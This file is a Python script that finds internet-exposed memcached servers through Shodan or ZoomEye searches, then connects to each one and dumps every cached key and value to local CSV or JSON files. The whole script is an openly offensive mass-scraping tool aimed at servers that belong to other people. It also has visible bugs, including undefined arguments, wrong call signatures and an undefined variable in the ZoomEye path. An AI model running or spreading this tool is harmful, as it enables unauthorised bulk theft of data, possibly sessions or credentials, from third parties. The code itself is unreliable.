#!/usr/bin/env python

import shodan
import socket
import json
import csv
import argparse
import os
from os import listdir
from os.path import isfile, join
import requests

def make_query(query, s, chunk=4096):
    s.sendall("{}\r\n".format(query).encode())
    if not s:
        raise Exception("Socket not connected.")
    buf = bytes()
    while True:
        if buf[-2:] == b"\r\n":
            break
        data = s.recv(chunk)
        if not data:
            raise Exception("Broken socket")
        buf += data
    return buf[:-2].decode().split("\r\n")


def get_key_lengths(s):
    k = set()
    for line in make_query("stats items", s):
        tokens = line.split(":")
        if len(tokens) == 3:
            k.add(tokens[1])
    return k


def dump_key(key, s):
    for tag in make_query("stats cachedump {} 999999".format(key), s)[:-1]:
        elements = tag.split(" ")
        yield elements[1] if len(elements) >= 3 else None


def dump_values(keys, s):
    response = make_query("get {}".format(" ".join(keys)), s)
    result = {}
    for i in range(0, len(response) - 1, 2):
        result[response[i].split(" ")[1]] = response[i + 1]
    return result


def scrape(server, outdir, as_json):
    print("[ ] Connecting to {}:{}.".format(
        server.get("ip_str"), server.get("port")))
    s = socket.create_connection(
        (server.get("ip_str"), server.get("port")), timeout=5)
    ip = server.get("ip_str")
    key_lengths = get_key_lengths(s)
    print("[ ] Found {} key lengths at {}.".format(len(key_lengths), ip))
    cache = set()
    for key_length in key_lengths:
        cache.update(dump_key(key_length, s))
    print("[ ] Found {} keys at {}.".format(len(cache), ip))
    values = dump_values(cache, s)
    print("[ ] Dumped {} key values from {}.".format(len(values), ip))
    if as_json:
        fname = os.path.join(outdir, "{}.json".format(ip))
        with open(fname, "w") as out_file:
            out_file.write(json.dumps(values))
        print("[+] Wrote JSON to {}".format(fname))
    else:
        fname = os.path.join(outdir, "{}.csv".format(ip))
        with open(fname, "w", newline="") as out_file:
            writer = csv.writer(out_file)
            writer.writerow(["Key", "Value"])
            for (k, v) in values.items():
                writer.writerow([k, v])
        print("[+] Wrote CSV to {}".format(fname))


def get_servers(api_key, continue_flag, outdir):
    api = shodan.Shodan(api_key)
    memcached_servers = []
    try:
        results = api.search("product:memcached")
        print("Results found: {}".format(results["total"]))
        for result in results.get("matches"):
            elem = {"ip_str": result.get("ip_str"), "port": result.get("port")}
            memcached_servers.append(elem)
            print("[ ] Found memcached server at IP: {}".format(result["ip_str"]))
    except shodan.APIError as e:
        print('[-] Shodan error: %s' % e)
    if continue_flag:
        # Get files currently in output directory and remove .csv or .json extension so we just have the IP address
        currentfiles = [os.path.splitext(f)[0] for f in listdir(outdir) if isfile(join(outdir, f))]
        memcached_servers = [x for x in memcached_servers if x not in currentfiles]     
    return memcached_servers

def zoomeye_login(username, password, continue_flag, outdir):
    zoomeye_auth_api = "https://api.zoomeye.org/user/login"
    data = '{{"username": "{}", "password": "{}"}}'.format(username, password)
    resp = requests.post(zoomeye_auth_api, data=data)

    if resp and resp.status_code == 200 and 'access_token' in resp.json():
        token  = resp.json().get('access_token')
        return token
    else:
        print('[-] ZoomEye Authentication Error')
        exit()
        
def get_servers_zoomeye(api_key, continue_flag, outdir):
    servers = []
    zoomeye_dork_api = "https://api.zoomeye.org/host/search"
    headers = {'Authorization': 'JWT %s' % api_key}

    for i in range (1,501):
        #Max. Allowed Page Limits -> 500
        params = {'query': 'app:"memcached"', 'page': i, 'facet':['ip']}
        resp = requests.get(zoomeye_dork_api, params=params, headers=headers)

        if resp and resp.status_code == 200 and 'matches' in resp.json():
            matches = resp.json().get('matches')
            for i in matches:
                print('[ ] Found memcached server at IP: {}'.format(i.get('ip')))
                servers.append(i.get('ip'))
        else:
            print('[-] ZoomEye Error')
            break;
    if continue_flag:
        # Get files currently in output directory and remove .csv or .json extension so we just have the IP address
        currentfiles = [os.path.splitext(f)[0] for f in listdir(outdir) if isfile(join(outdir, f))]
        memcached_servers = [x for x in memcached_servers if x not in currentfiles]     
    return servers

parser = argparse.ArgumentParser(description='Scrape data from memcached servers.')
parser.add_argument('--key', type=str, help='Shodan API key.')
parser.add_argument('--email', type=str, help='ZoomEye Email')
parser.add_argument('--password', type=str, help='ZoomEye Password')
parser.add_argument('--out', type=str, default="out", help='Output directory for caches.')
parser.add_argument('--json', action='store_true', default=False, help='Output as JSON. (Default: CSV)')
parser.add_argument('--continue', dest='continue_flag', default=False, action='store_true', help='Continue, ignoring servers already listed in output directory.')
args = parser.parse_args()
if not os.path.exists(args.out):
    os.makedirs(args.out)
if(args.username and args.password):
    api_key = zoomeye_login(args.username, args.password, args.continue_flag, args.out)
    servers = get_servers_zoomeye(api_key)
else:
    servers = get_servers(args.key, args.continue_flag, args.out)
for server in servers:
    try:
        scrape(server, args.out, args.json)
    except Exception as e:
        print("[-] Error connecting to {}: {}".format(server.get("ip_str"), e))
